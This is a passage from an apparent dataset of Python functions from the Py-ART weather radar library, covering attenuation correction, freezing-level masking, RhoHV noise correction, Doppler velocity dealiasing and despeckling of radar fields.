            (pia_coef, pida_coef) = _param_attphilinear_table()['C']
            warn('Radar frequency unknown. Default ' + 'coefficients for C band will be applied.')
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if zdr_field is None:
        zdr_field = get_field_name('differential_reflectivity')
    if phidp_field is None:
        phidp_field = get_field_name('corrected_differential_phase')
        if phidp_field not in radar.fields:
            phidp_field = get_field_name('unfolded_differential_phase')
        if phidp_field not in radar.fields:
            phidp_field = get_field_name('differential_phase')
    if spec_at_field is None:
        spec_at_field = get_field_name('specific_attenuation')
    if pia_field is None:
        pia_field = get_field_name('path_integrated_attenuation')
    if corr_refl_field is None:
        corr_refl_field = get_field_name('corrected_reflectivity')
    if spec_diff_at_field is None:
        spec_diff_at_field = get_field_name('specific_differential_attenuation')
    if pida_field is None:
        pida_field = get_field_name('path_integrated_differential_attenuation')
    if corr_zdr_field is None:
        corr_zdr_field = get_field_name('corrected_differential_reflectivity')
    if temp_ref == 'temperature':
        if temp_field is None:
            temp_field = get_field_name('temperature')
    elif temp_ref == 'height_over_iso0':
        if iso0_field is None:
            iso0_field = get_field_name('height_over_iso0')
    radar.check_field_exists(refl_field)
    refl = radar.fields[refl_field]['data']
    radar.check_field_exists(phidp_field)
    phidp = deepcopy(radar.fields[phidp_field]['data'])
    try:
        radar.check_field_exists(zdr_field)
        zdr = radar.fields[zdr_field]['data']
    except KeyError:
        zdr = None
    (mask_fzl, _) = get_mask_fzl(radar, fzl=fzl, doc=doc, min_temp=0, max_h_iso0=0.0, thickness=None, beamwidth=None, temp_field=temp_field, iso0_field=iso0_field, temp_ref=temp_ref)
    if gatefilter is None:
        mask = np.ma.getmaskarray(refl)
    else:
        mask = gatefilter.gate_excluded
        mask_fzl = np.logical_or(mask, mask_fzl)
    corr_phidp = _prepare_phidp(phidp, mask_fzl)
    dr = (radar.range['data'][1] - radar.range['data'][0]) / 1000.0
    pia = pia_coef * corr_phidp
    ah = 0.5 * np.gradient(pia, dr, axis=1)
    spec_at = get_metadata(spec_at_field)
    spec_at['data'] = np.ma.masked_where(mask, np.ma.array(ah))
    pia_dict = get_metadata(pia_field)
    pia_dict['data'] = np.ma.masked_where(mask, np.ma.array(pia))
    cor_z = get_metadata(corr_refl_field)
    cor_z['data'] = np.ma.masked_where(mask, np.ma.array(pia + refl))
    if zdr is not None:
        pida = pida_coef * corr_phidp
        adiff = 0.5 * np.gradient(pida, dr, axis=1)
        spec_diff_at = get_metadata(spec_diff_at_field)
        spec_diff_at['data'] = np.ma.masked_where(mask, adiff)
        pida_dict = get_metadata(pida_field)
        pida_dict['data'] = np.ma.masked_where(mask, pida)
        cor_zdr = get_metadata(corr_zdr_field)
        cor_zdr['data'] = np.ma.masked_where(mask, pida + zdr)
    return (spec_at, pia_dict, cor_z, spec_diff_at, pida_dict, cor_zdr)"
ARM-DOE/pyart,get_mask_fzl,"def get_mask_fzl(radar, fzl=None, doc=None, min_temp=0.0, max_h_iso0=0.0, thickness=None, beamwidth=None, temp_field=None, iso0_field=None, temp_ref='temperature'):
    """"""
    Constructs a mask to mask data placed thickness m below data at min_temp
    and beyond.

    Parameters
    ----------
    radar : Radar
        The radar object.
    fzl : float, optional
        Freezing layer, gates above this point are not included in the
        correction.
    doc : float, optional
        Number of gates at the end of each ray to to remove from the
        calculation.
    min_temp : float, optional
        Minimum temperature below which the data is mask in degrees.
    max_h_iso0 : float, optional
        Maximum height relative to the iso0 below which the data is mask in
        meters.
    thickness : float, optional
        Extent of the layer below the first gate where min_temp is reached
        that is going to be masked.
    beamwidth : float, optional
        The radar antenna 3 dB beamwidth.
    temp_field: str, optional
        The temperature field. A value of None will use the default
        field name as defined in the Py-ART configuration file. It is going
        to be used only if available.
    iso0_field: str, optional
        The field containing the height over the 0C isotherm. A value of None
        will use the default field name as defined in the Py-ART
        configuration file. It is going to be used only if available.
    temp_ref : str, optional
        The field use as reference for temperature. Can be either temperature,
        height_over_iso0 or fixed_fzl.

    Returns
    -------
    mask_fzl : 2D array
        The values that should be masked.
    end_gate_arr : 1D array
        The index of the last valid gate in the ray.

    """"""
    if temp_ref == 'temperature':
        if temp_field is None:
            temp_field = get_field_name('temperature')
    elif temp_ref == 'height_over_iso0':
        if iso0_field is None:
            iso0_field = get_field_name('height_over_iso0')
    if temp_ref == 'fixed_fzl':
        if fzl is None:
            fzl = 4000.0
            doc = 15
            warn('Freezing level height not specified. ' + 'Using default ' + str(fzl) + ' [m]')
        end_gate_arr = np.zeros(radar.nrays, dtype='int32')
        mask_fzl = np.zeros((radar.nrays, radar.ngates), dtype=np.bool_)
        for sweep in range(radar.nsweeps):
            (end_gate, start_ray, end_ray) = det_process_range(radar, sweep, fzl, doc=doc)
            end_gate_arr[start_ray:end_ray] = end_gate
            mask_fzl[start_ray:end_ray, end_gate + 1:] = True
    elif temp_ref == 'temperature':
        if temp_field in radar.fields:
            gatefilter = temp_based_gate_filter(radar, temp_field=temp_field, min_temp=min_temp, thickness=thickness, beamwidth=beamwidth)
            end_gate_arr = np.zeros(radar.nrays, dtype='int32')
            for ray in range(radar.nrays):
                ind_rng = np.where(gatefilter.gate_excluded[ray, :] == 1)[0]
                if len(ind_rng) > 0:
                    if ind_rng[0] > 0:
                        end_gate_arr[ray] = ind_rng[0] - 1
                    else:
                        end_gate_arr[ray] = 0
                else:
                    end_gate_arr[ray] = radar.ngates - 1
            mask_fzl = gatefilter.gate_excluded == 1
        else:
            fzl = 4000.0
            doc = 15
            warn('Temperature field not available.' + 'Using default freezing level height ' + str(fzl) + ' [m].')
    elif iso0_field in radar.fields:
        gatefilter = iso0_based_gate_filter(radar, iso0_field=iso0_field, max_h_iso0=max_h_iso0, thickness=thickness, beamwidth=beamwidth)
        end_gate_arr = np.zeros(radar.nrays, dtype='int32')
        for ray in range(radar.nrays):
            ind_rng = np.where(gatefilter.gate_excluded[ray, :] == 1)[0]
            if len(ind_rng) > 0:
                if ind_rng[0] > 0:
                    end_gate_arr[ray] = ind_rng[0] - 1
                else:
                    end_gate_arr[ray] = 0
            else:
                end_gate_arr[ray] = radar.ngates - 1
        mask_fzl = gatefilter.gate_excluded == 1
    else:
        fzl = 4000.0
        doc = 15
        warn('Height over iso0 field not available.' + 'Using default freezing level height ' + str(fzl) + ' [m].')
    return (mask_fzl, end_gate_arr)"
ARM-DOE/pyart,_prepare_phidp,"def _prepare_phidp(phidp, mask_fzl):
    """"""
    Prepares phidp to be used in attenuation correction by masking values
    above freezing level setting negative values to 0 and make sure it is
    monotously increasing.

    Parameters
    ----------
    phidp : ndarray 2D
        The phidp field.
    mask_fzl : ndarray 2D
        A mask of the data above freezing level height.

    Returns
    -------
    corr_phidp: ndarray 2D
        The corrected PhiDP field.

    """"""
    mask_phidp = np.ma.getmaskarray(phidp)
    mask_phidp = np.logical_or(mask_phidp, mask_fzl)
    mask_phidp = np.logical_or(mask_phidp, phidp < 0.0)
    corr_phidp = np.ma.masked_where(mask_phidp, phidp)
    return np.maximum.accumulate(corr_phidp.filled(fill_value=0.0), axis=1)"
ARM-DOE/pyart,_get_param_attzphi,"def _get_param_attzphi(freq):
    """"""
    Get the parameters of Z-Phi attenuation estimation for a particular
    frequency.

    Parameters
    ----------
    freq : float
        Radar frequency [Hz].

    Returns
    -------
    a_coeff, beta, c, d : floats
        The coefficient and exponent of the power law.

    """"""
    param_att_dict = _param_attzphi_table()
    freq_band = get_freq_band(freq)
    if freq_band is not None and freq_band in param_att_dict:
        return param_att_dict[freq_band]
    if freq < 2000000000.0:
        freq_band_aux = 'S'
    elif freq > 12000000000.0:
        freq_band_aux = 'X'
    warn('Radar frequency out of range. ' + 'Coefficients only applied to S, C or X band. ' + freq_band + ' band coefficients will be used.')
    return param_att_dict[freq_band_aux]"
ARM-DOE/pyart,_param_attzphi_table,"def _param_attzphi_table():
    """"""
    Defines the parameters of Z-Phi attenuation estimation at each frequency
    band.

    Returns
    -------
    param_att_dict : dict
        A dictionary with the coefficients at each band.

    """"""
    param_att_dict = dict()
    param_att_dict.update({'S': (0.02, 0.64884, 0.15917, 1.0804)})
    param_att_dict.update({'C': (0.08, 0.64884, 0.3, 1.0804)})
    param_att_dict.update({'X': (0.31916, 0.64884, 0.15917, 1.0804)})
    return param_att_dict"
ARM-DOE/pyart,_get_param_attphilinear,"def _get_param_attphilinear(freq):
    """"""
    Get the parameters of attenuation estimation based on phidp for a
    particular frequency.

    Parameters
    ----------
    freq : float
        Radar frequency [Hz].

    Returns
    -------
    a_coeff, beta, c, d : floats
        The coefficient and exponent of the power law.

    """"""
    param_att_dict = _param_attphilinear_table()
    freq_band = get_freq_band(freq)
    if freq_band is not None and freq_band in param_att_dict:
        return param_att_dict[freq_band]
    if freq < 2000000000.0:
        freq_band_aux = 'S'
    elif freq > 12000000000.0:
        freq_band_aux = 'X'
    warn('Radar frequency out of range. ' + 'Coefficients only applied to S, C or X band. ' + freq_band_aux + ' band coefficients will be used.')
    return param_att_dict[freq_band_aux]"
ARM-DOE/pyart,_param_attphilinear_table,"def _param_attphilinear_table():
    """"""
    Defines the parameters of attenuation estimation based on phidp at each
    frequency band.

    Returns
    -------
    param_att_dict : dict
        A dictionary with the coefficients at each band.

    """"""
    param_att_dict = dict()
    param_att_dict.update({'S': (0.04, 0.004)})
    param_att_dict.update({'C': (0.08, 0.03)})
    param_att_dict.update({'X': (0.28, 0.04)})
    return param_att_dict"
ARM-DOE/pyart,calculate_attenuation,"def calculate_attenuation(radar, z_offset, debug=False, doc=15, fzl=4000.0, gatefilter=None, rhv_min=0.8, ncp_min=0.5, a_coef=0.06, beta=0.8, refl_field=None, ncp_field=None, rhv_field=None, phidp_field=None, spec_at_field=None, corr_refl_field=None):
    """"""
    Calculate the attenuation from a polarimetric radar using Z-PHI method.

    Parameters
    ----------
    radar : Radar
        Radar object to use for attenuation calculations. Must have
        copol_coeff, norm_coherent_power, proc_dp_phase_shift,
        reflectivity_horizontal fields.
    z_offset : float
        Horizontal reflectivity offset in dBZ.
    debug : bool, optional
        True to print debugging information, False supressed this printing.
    doc : float, optional
        Number of gates at the end of each ray to to remove from the
        calculation.
    fzl : float, optional
        Freezing layer, gates above this point are not included in the
        correction.
    gatefilter : GateFilter, optional
        The gates to exclude from the calculation. This, combined with
        the gates above fzl, will be excluded from the correction. Set to
        None to not use a gatefilter.
    rhv_min : float, optional
        Minimum copol_coeff value to consider valid.
    ncp_min : float, optional
        Minimum norm_coherent_power to consider valid.
    a_coef : float, optional
        A coefficient in attenuation calculation.
    beta : float, optional
        Beta parameter in attenuation calculation.
    refl_field : str, optional
        Name of the reflectivity field used for the attenuation correction.
        A value of None for any of these parameters will use the default
        field name as defined in the Py-ART configuration file.
    phidp_field : str, optional
        Name of the differential phase field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file.
    ncp_field : str, optional
        Name of the normalized coherent power field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file.
    zdr_field : str, optional
        Name of the differential reflectivity field used for the attenuation
        correction. A value of None for any of these parameters will use the
        default field name as defined in the Py-ART configuration file. This
        will only be used if it is available.
    spec_at_field : str, optional
        Name of the specific attenuation field that will be used to fill in
        the metadata for the returned fields. A value of None for any of these
        parameters will use the default field names as defined in the Py-ART
        configuration file.
    corr_refl_field : str, optional
        Name of the corrected reflectivity field that will be used to fill in
        the metadata for the returned fields. A value of None for any of these
        parameters will use the default field names as defined in the Py-ART
        configuration file.

    Returns
    -------
    spec_at : dict
        Field dictionary containing the specific attenuation.
    cor_z : dict
        Field dictionary containing the corrected reflectivity.

    References
    ----------
    Gu et al. Polarimetric Attenuation Correction in Heavy Rain at C Band,
    JAMC, 2011, 50, 39-58.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if ncp_field is None:
        ncp_field = get_field_name('normalized_coherent_power')
    if rhv_field is None:
        rhv_field = get_field_name('cross_correlation_ratio')
    if phidp_field is None:
        phidp_field = get_field_name('corrected_differential_phase')
        if phidp_field not in radar.fields:
            phidp_field = get_field_name('unfolded_differential_phase')
        if phidp_field not in radar.fields:
            phidp_field = get_field_name('differential_phase')
    if spec_at_field is None:
        spec_at_field = get_field_name('specific_attenuation')
    if corr_refl_field is None:
        corr_refl_field = get_field_name('corrected_reflectivity')
    reflectivity_horizontal = radar.fields[refl_field]['data']
    proc_dp_phase_shift = radar.fields[phidp_field]['data']
    nsweeps = int(radar.nsweeps)
    if gatefilter is None:
        gatefilter = GateFilter(radar)
    gatefilter.exclude_invalid(refl_field)
    gatefilter.exclude_below(rhv_field, rhv_min)
    gatefilter.exclude_below(ncp_field, ncp_min)
    mask = gatefilter.gate_excluded
    refl = np.ma.masked_where(mask, reflectivity_horizontal + z_offset)
    init_refl_correct = refl + proc_dp_phase_shift * a_coef
    dr = (radar.range['data'][1] - radar.range['data'][0]) / 1000.0
    specific_atten = np.zeros(reflectivity_horizontal.shape, dtype='float32')
    atten = np.zeros(reflectivity_horizontal.shape, dtype='float32')
    for sweep in range(nsweeps):
        if debug:
            print('Doing ', sweep)
        (end_gate, start_ray, end_ray) = det_process_range(radar, sweep, fzl, doc=doc)
        for i in range(start_ray, end_ray):
            ray_phase_shift = proc_dp_phase_shift[i, 0:end_gate]
            ray_init_refl = init_refl_correct[i, 0:end_gate]
            last_six_good = np.where(~mask[i, 0:end_gate])[0][-6:]
            phidp_max = np.median(ray_phase_shift[last_six_good])
            sm_refl = smooth_and_trim(ray_init_refl, window_len=5)
            reflectivity_linear = 10.0 ** (0.1 * beta * sm_refl)
            self_cons_number = 10.0 ** (0.1 * beta * a_coef * phidp_max) - 1.0
            I_indef = cumtrapz(0.46 * beta * dr * reflectivity_linear[::-1])
            I_indef = np.append(I_indef, I_indef[-1])[::-1]
            specific_atten[i, 0:end_gate] = reflectivity_linear * self_cons_number / (I_indef[0] + self_cons_number * I_indef)
            atten[i, :-1] = cumtrapz(specific_atten[i, :]) * dr * 2.0
            atten[i, -1] = atten[i, -2]
    spec_at = get_metadata(spec_at_field)
    spec_at['data'] = specific_atten
    spec_at['_FillValue'] = get_fillvalue()
    cor_z = get_metadata(corr_refl_field)
    cor_z['data'] = atten + reflectivity_horizontal + z_offset
    cor_z['data'].mask = init_refl_correct.mask
    cor_z['_FillValue'] = get_fillvalue()
    return (spec_at, cor_z)"
ARM-DOE/pyart,correct_noise_rhohv,"def correct_noise_rhohv(radar, urhohv_field=None, snr_field=None, zdr_field=None, nh_field=None, nv_field=None, rhohv_field=None):
    """"""
    Corrects RhoHV for noise according to eq. 6 in Gourley et al. 2006.
    This correction should only be performed if noise has not been subtracted
    from the signal during the moments computation.

    Parameters
    ----------
    radar : Radar
        Radar object.
    urhohv_field : str, optional
        Name of the RhoHV uncorrected for noise field.
    snr_field, zdr_field, nh_field, nv_field : str, optional
        Names of the SNR, ZDR, horizontal channel noise in dBZ and vertical
        channel noise in dBZ used to correct RhoHV.
    rhohv_field : str, optional
        Name of the rhohv field to output.

    Returns
    -------
    rhohv : dict
        Noise corrected RhoHV field.

    References
    ----------
    Gourley et al. Data Quality of the Meteo-France C-Band Polarimetric
    Radar, JAOT, 23, 1340-1356

    """"""
    if urhohv_field is None:
        urhohv_field = get_field_name('uncorrected_cross_correlation_ratio')
    if snr_field is None:
        snr_field = get_field_name('signal_to_noise_ratio')
    if zdr_field is None:
        zdr_field = get_field_name('differential_reflectivity')
    if nh_field is None:
        nh_field = get_field_name('noisedBZ_hh')
    if nv_field is None:
        nv_field = get_field_name('noisedBZ_vv')
    if rhohv_field is None:
        rhohv_field = get_field_name('cross_correlation_ratio')
    if urhohv_field in radar.fields:
        urhohv = radar.fields[urhohv_field]['data']
    else:
        raise KeyError('Field not available: ' + urhohv_field)
    if snr_field in radar.fields:
        snrdB_h = radar.fields[snr_field]['data']
    else:
        raise KeyError('Field not available: ' + snr_field)
    if zdr_field in radar.fields:
        zdrdB = radar.fields[zdr_field]['data']
    else:
        raise KeyError('Field not available: ' + zdr_field)
    if nh_field in radar.fields:
        nh = radar.fields[nh_field]['data']
    else:
        raise KeyError('Field not available: ' + nh_field)
    if nv_field in radar.fields:
        nv = radar.fields[nv_field]['data']
    else:
        raise KeyError('Field not available: ' + nv_field)
    snr_h = np.ma.power(10.0, 0.1 * snrdB_h)
    zdr = np.ma.power(10.0, 0.1 * zdrdB)
    alpha = np.ma.power(10.0, 0.1 * (nh - nv))
    rhohv_data = urhohv * np.ma.sqrt((1.0 + 1.0 / snr_h) * (1.0 + zdr / (alpha * snr_h)))
    rhohv_data[rhohv_data > 1.0] = 1.0
    rhohv = get_metadata(rhohv_field)
    rhohv['data'] = rhohv_data
    return rhohv"
ARM-DOE/pyart,correct_bias,"def correct_bias(radar, bias=0.0, field_name=None):
    """"""
    Corrects a radar data bias. If field name is none the correction is
    applied to horizontal reflectivity by default.

    Parameters
    ----------
    radar : Radar
        Radar object.
    bias : float, optional
        The bias magnitude.
    field_name: str, optional
        Names of the field to be corrected.

    Returns
    -------
    corrected_field : dict
        The corrected field

    """"""
    if field_name is None:
        field_name = get_field_name('reflectivity')
    if field_name in radar.fields:
        field_data = radar.fields[field_name]['data']
    else:
        raise KeyError('Field not available: ' + field_name)
    corr_field_data = field_data - bias
    if field_name.startswith('corrected_'):
        corr_field_name = field_name
    else:
        corr_field_name = 'corrected_' + field_name
    corr_field = get_metadata(corr_field_name)
    corr_field['data'] = corr_field_data
    return corr_field"
ARM-DOE/pyart,dealias_fourdd,"def dealias_fourdd(radar, last_radar=None, sonde_profile=None, gatefilter=False, filt=1, rsl_badval=131072.0, keep_original=False, set_limits=True, vel_field=None, corr_vel_field=None, last_vel_field=None, debug=False, max_shear=0.05, sign=1, **kwargs):
    """"""
    Dealias Doppler velocities using the 4DD algorithm.

    Dealias the Doppler velocities field using the University of Washington
    4DD algorithm utilizing information from a previous volume scan and/or
    sounding data. Either last_radar or sonde_profile must be provided.
    For best results provide both a previous volume scan and sounding data.
    Radar and last_radar must contain the same number of rays per sweep.

    Additional arguments are passed to
    :py:func:`_fourdd_interface.fourdd_dealias`.
    These can be used to fine tune the behavior of the FourDD algorithm.
    See the documentation of Other Parameters for details.  For the default
    values of these parameters see the documentation of
    :py:func:`_fourdd_interface.fourdd_dealias`.

    Parameters
    ----------
    radar : Radar
        Radar object to use for dealiasing. Must have a Nyquist defined in
        the instrument_parameters attribute and have a
        reflectivity_horizontal and mean_doppler_velocity fields.
    last_radar : Radar, optional
        The previous radar volume, which has been successfully
        dealiased. Using a previous volume as an initial condition can
        greatly improve the dealiasing, and represents the final dimension
        in the 4DD algorithm.
    sonde_profile : HorizontalWindProfile, optional
        Profile of horizontal winds from a sonding used for the initial
        condition of the dealiasing.

    Other Parameters
    ----------------
    gatefilter : GateFilter, optional.
        A GateFilter instance which specifies which gates should be
        ignored when performing velocity dealiasing. A value of None will
        create this filter from the radar moments using any additional
        arguments by passing them to :py:func:`moment_based_gate_filter`. The
        default value assumes all gates are valid.
    filt : int, optional
        Flag controlling Bergen and Albers filter, 1 = yes, 0 = no.
    rsl_badval : float, optional
        Value which represents a bad value in RSL.
    keep_original : bool, optional
        True to keep original doppler velocity values when the dealiasing
        procedure fails, otherwise these gates will be masked. NaN values
        are still masked.
    set_limits : bool, optional
        True to set valid_min and valid_max elements in the returned
        dictionary. False will not set these dictionary elements.
    vel_field : str, optional
        Field in radar to use as the Doppler velocities during dealiasing.
        None will use the default field name from the Py-ART configuration
        file.
    corr_vel_field : str, optional
        Name to use for the dealiased Doppler velocity field metadata. None
        will use the default field name from the Py-ART configuration file.
    last_vel_field : str, optional
        Name to use for the dealiased Doppler velocity field metadata in
        last_radar. None will use the corr_vel_field name.
    maxshear : float, optional
        Maximum vertical shear which will be incorporated into the created
        volume from the sounding data. Parameter not used when no
        sounding data is provided.
    sign : int, optional
        Sign convention which the radial velocities in the volume created
        from the sounding data will will. This should match the convention
        used in the radar data. A value of 1 represents when positive values
        velocities are towards the radar, -1 represents when negative
        velocities are towards the radar.
    compthresh : float, optional
        Fraction of the Nyquist velocity to use as a threshold when performing
        continuity (initial) dealiasing. Velocities differences above this
        threshold will not be marked as gate from which to begin unfolding
        during spatial dealiasing.
    compthresh2 : float, optional
        The same as compthresh but the value used during the second pass of
        dealiasing. This second pass is only performed in both a sounding
        and last volume are provided.
    thresh : float, optional
        Fraction of the Nyquist velocity to use as a threshold when performing
        spatial dealiasing. Horizontally adjacent gates with velocities above
        this threshold will count against assigning the gate in question the
        velocity value being tested.
    ckval : float, optional
        When the absolute value of the velocities are below this value they
        will not be marked as gates from which to begin unfolding during
        spatial dealiasing.
    stdthresh : float, optional
       Fraction of the Nyquist velocity to use as a standard deviation
       threshold in the window dealiasing portion of the algorithm.
    epsilon : float, optional
        Difference used when comparing a value to missing value, changing this
        from the default is not recommended.
    maxcount : int, optional
        Maximum allowed number of fold allowed when unfolding velocities.
    pass2 : int, optional
        Controls weather unfolded gates should be removed (a value of 0)
        or retained for unfolding during the second pass (a value of 1) when
        both a sounding volume and last volume are provided.
    rm : int, optional
        Determines what should be done with gates that are left unfolded
        after the first pass of dealiasing. A value of 1 will remove these
        gates, a value of 0 sets these gates to their initial velocity.  If
        both a sounding volume and last volume are provided this parameter is
        ignored.
    proximity : int, optional
        Number of gates and rays to include of either side of the current gate
        during window dealiasing. This value may be doubled in cases where
        a standard sized window does not capture a sufficient number of
        good valued gates.
    mingood : int, optional
        Number of good valued gates required within the window before the
        current gate will be unfolded.
    ba_mincount : int, optional
        Number of neighbors required during Bergen and Albers filter for
        a given gate to be included, must be between 1 and 8, 5 recommended.
    ba_edgecount : int, optional
        Same as ba_mincount but used at ray edges, must be between 1 and 5,
        3 recommended.
    debug : bool, optional
        Set True to return RSL Volume objects for debugging:
        usuccess, radialVelVolume, lastVelVolume, unfoldedVolume, sondVolume

    Returns
    -------
    vr_corr : dict
        Field dictionary containing dealiased Doppler velocities. Dealiased
        array is stored under the 'data' key.

    Notes
    -----
    Due to limitations in the C code do not call with sounding arrays over
    999 elements long.

    References
    ----------
    C. N. James and R. A Houze Jr, A Real-Time Four-Dimensional Doppler
    Dealising Scheme, Journal of Atmospheric and Oceanic Technology, 2001, 18,
    1674.

    """"""
    if not _FOURDD_AVAILABLE:
        raise MissingOptionalDependency('Py-ART must be build with support for TRMM RSL to use' + ' the dealias_fourdd function.')
    if sonde_profile is None and last_radar is None:
        raise ValueError('sonde_profile or last_radar must be provided.')
    if vel_field is None:
        vel_field = get_field_name('velocity')
    if corr_vel_field is None:
        corr_vel_field = get_field_name('corrected_velocity')
    if last_vel_field is None:
        last_vel_field = get_field_name('corrected_velocity')
    fill_value = get_fillvalue()
    gatefilter = _parse_gatefilter(gatefilter, radar, **kwargs)
    excluded = gatefilter.gate_excluded
    vel_volume = _create_rsl_volume(radar, vel_field, 1, rsl_badval, excluded)
    if last_radar is not None:
        last_vel_volume = _create_rsl_volume(last_radar, last_vel_field, 1, rsl_badval)
    else:
        last_vel_volume = None
    if sonde_profile is not None:
        height = np.ascontiguousarray(sonde_profile.height, dtype=np.float32)
        speed = np.ascontiguousarray(sonde_profile.speed, dtype=np.float32)
        wdir = np.ascontiguousarray(sonde_profile.direction, dtype=np.float32)
        if len(height) > 999:
            raise ValueError('Too many sounding heights, maximum is 999')
        (success, sound_volume) = _fourdd_interface.create_soundvolume(vel_volume, height, speed, wdir, sign, max_shear)
        if success == 0:
            raise ValueError('Error when loading sounding data.')
    else:
        sound_volume = None
    if debug:
        return _fourdd_interface.fourdd_dealias(vel_volume, last_vel_volume, sound_volume, filt, debug=True, **kwargs)
    (_, data) = _fourdd_interface.fourdd_dealias(vel_volume, last_vel_volume, sound_volume, filt, debug=False, **kwargs)
    is_bad_data = np.logical_or(np.isnan(data), data == rsl_badval)
    if keep_original:
        vel_array = radar.fields[vel_field]['data']
        data = np.where(is_bad_data, vel_array, data)
    else:
        data[is_bad_data] = fill_value
    data = np.ma.masked_equal(data, fill_value)
    vr_corr = get_metadata(corr_vel_field)
    vr_corr['data'] = data
    vr_corr['_FillValue'] = data.fill_value
    if set_limits:
        nyquist_vel = radar.instrument_parameters['nyquist_velocity']['data']
        _set_limits(data, nyquist_vel, vr_corr)
    return vr_corr"
ARM-DOE/pyart,_create_rsl_volume,"def _create_rsl_volume(radar, field_name, vol_num, rsl_badval, excluded=None):
    """"""
    Create a RSLVolume containing data from a field in radar.
    """"""
    fill_value = get_fillvalue()
    fdata = np.copy(radar.fields[field_name]['data']).astype(np.float32)
    fdata = np.ma.filled(fdata, fill_value)
    is_bad = np.logical_or(fdata == fill_value, np.isnan(fdata))
    fdata[is_bad] = rsl_badval
    if excluded is not None:
        fdata[excluded] = rsl_badval
    rays_per_sweep = radar.sweep_end_ray_index['data'] - radar.sweep_start_ray_index['data'] + 1
    rays_per_sweep = rays_per_sweep.astype(np.int32)
    rsl_volume = _rsl_interface.create_volume(fdata, rays_per_sweep, vol_num)
    _rsl_interface._label_volume(rsl_volume, radar)
    return rsl_volume"
ARM-DOE/pyart,find_objects,"def find_objects(radar, field, threshold, sweeps=None, smooth=None, gatefilter=None, delta=DELTA):
    """"""
    Find objects (i.e., contiguous gates) in one or more sweeps that match
    thresholds. Filtering & smoothing are available prior to labeling objects.
    In addition, periodic boundaries are accounted for if they exist
    (e.g., 360-deg PPIs). Requires scipy to be installed.

    Parameters
    ----------
    radar : pyart.core.Radar object
        Radar object to query.
    field : str
        Name of field to investigate for objects.
    threshold : int or float, or 2-element tuple of ints or floats
        Threshold values above (if single value) or between (if tuple)
        for objects to be identified.

    Other Parameters
    ----------------
    sweeps : int or array of ints or None, optional
        Sweep numbers to examine. If None, all sweeps are examined.
    smooth : int or None, optional
        Number of gates included in a smoothing box filter along a ray.
        If None, no smoothing is done prior to labeling objects.
    gatefilter : None or pyart.filters.GateFilter object, optional
        Py-ART GateFilter object to apply before labeling objects.
        If None, no filtering will be performed. Note: Filtering always occurs
        before smoothing.
    delta : int or float, optional
        Size of allowable gap near PPI edges, in deg, to consider it full 360.
        If gap is small, then PPI edges will be checked for matching objects
        along the periodic boundary.

    Returns
    -------
    label_dict : dict
        Dictionary that contains all the labeled objects. If this function is
        performed on the full Radar object, then the dict is ready to be added
        as a field.

    """"""
    if field not in radar.fields.keys():
        raise KeyError('Failed -', field, 'field not found in Radar object.')
    sweeps = _check_sweeps(sweeps, radar)
    (tlo, thi) = _check_threshold(threshold)
    objcnt = 0
    label_storage = []
    for iswp in sweeps:
        data = _get_data(radar, iswp, field, tlo, thi, smooth, gatefilter=gatefilter)
        az = radar.get_azimuth(iswp, copy=False)
        if _check_for_360(az, delta):
            (labels, nobj) = _adjust_for_periodic_boundary(data)
        else:
            (labels, nobj) = _get_labels(data)
        labels[labels != 0] += objcnt
        objcnt += nobj
        label_storage = _append_labels(labels, label_storage)
    label_storage = np.ma.masked_where(label_storage == 0, label_storage)
    return _generate_dict(label_storage)"
ARM-DOE/pyart,despeckle_field,"def despeckle_field(radar, field, label_dict=None, threshold=-100, size=10, gatefilter=None, delta=DELTA):
    """"""
    Despeckle a radar volume by identifying small objects in each scan and
    masking them out. User can define which field to investigate, as well as
    various thresholds to use on that field and any objects found within.
    Requires scipy to be installed, and returns a GateFilter object.

    Parameters
    ----------
    radar : pyart.core.Radar object
        Radar object to query.
    field : str
        Name of field to investigate for speckles.

    Other Parameters
    ----------------
    label_dict : dict or None, optional
        Dictionary that is produced by find_objects.
        If None, find_objects will be called to produce it.
    threshold : int or float, or 2-element tuple of ints or floats
        Threshold values above (if single value) or between (if tuple)
        for objects to be identified. Default value assumes reflectivity.
    size : int, optional
        Number of contiguous gates in an object, below which it is a speckle.
    gatefilter : None or pyart.filters.GateFilter object
        Py-ART GateFilter object to which to add the despeckling mask. The
        GateFilter object will be permanently modified with the new filtering.
        If None, creates a new GateFilter.
    delta : int or float, optional
        Size of allowable gap near PPI edges, in deg, to consider it full 360.
        If gap is small, then PPI edges will be checked for matching objects.

    Returns
    -------
    gatefilter : pyart.filters.GateFilter object
        Py-ART GateFilter object that includes the despeckling mask

    """"""
    if field not in radar.fields.keys():
        raise KeyError('Failed -', field, 'field not found in Radar object.')
    if label_dict is None:
        label_dict = find_objects(radar, field, threshold, gatefilter=gatefilter, delta=delta)
    if gatefilter is None:
        gatefilter = GateFilter(radar)
    labels = label_dict['data']
    data = 1.0 * radar.fields[field]['data']
    mask_filter = gatefilter.gate_excluded
    data = np.ma.masked_array(data, mask_filter)
    data = data.filled(fill_value=BAD)
    labf = labels.filled(fill_value=0)
    cond1 = np.logical_and(data != BAD, labf > 0)
    labr = labf[cond1]
    data_r = data[cond1]
    iterarray = np.unique(labr)
    for (i, lab) in enumerate(iterarray):
        cond = labr == lab
        if np.size(labr[cond]) < size:
            data_r[cond] = BAD
    data[cond1] = data_r
    data = np.ma.masked_where(data == BAD, data)
    gatefilter.exclude_gates(data.mask)
    return gatefilter"
ARM-DOE/pyart,_adjust_for_periodic_boundary,"def _adjust_for_periodic_boundary(data):
    """"""
    Identify all the contiguous objects in a sweep, accounting for the
    periodic boundary in a 360-deg PPI. Contiguous means corners or sides
    of gates touch. The algorithm appends the sweep to itself, then looks
    for contiguous objects near the original PPI edges and relabels them.
    Then, the extra sweep is discarded before returning all the labels.

    Parameters
    ----------
    data : 2D array of ints
        Sweep that will be checked for objects. Sweep has already been
        converted to binary 0s/1s based on user-supplied thresholds.

    Returns
    -------
    labels : 2D array of ints
        Numeric object labels, corrected for the periodic boundary.
        Zero values mean no object at that location.
    nobj : int
        Number of distinct objects identified in sweep.

    """"""
    data = np.append(data, data, axis=0)
    (labels, nobj) = _get_labels(data)
    i1 = 0
    i2 = labels.shape[0] // 2
    old_labs = np.unique(labels[i2][labels[i2] > 0])
    for (i, lab) in enumerate(old_labs):
